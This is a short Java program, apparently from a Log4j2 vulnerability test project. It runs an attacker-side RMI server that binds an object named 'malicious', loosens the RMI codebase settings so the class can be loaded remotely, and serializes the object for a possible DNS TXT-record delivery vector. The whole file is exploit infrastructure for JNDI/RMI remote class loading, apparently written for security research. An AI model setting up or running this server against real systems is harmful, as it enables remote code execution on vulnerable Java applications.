import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {

        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("java.rmi.server.codebase", "file:///w/logging-log4j2-test/server/target/classes/MaliciousClass.class");

        Registry registry = LocateRegistry.createRegistry(1099);
        registry.rebind("malicious", new MaliciousClass());
        System.out.println("server is waiting...");
        new Thread(() -> {
            try {
                Thread.sleep(Integer.MAX_VALUE);
                System.out.println("stopped");
            } catch (InterruptedException e) {
                e.printStackTrace();
                System.out.println("stopped after exception");
            }
        }).start();

        // this is what we could maybe add to a dns txt record, if that vector worked
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(new MaliciousClass());
        System.out.println(new String(baos.toByteArray()));
    }
}
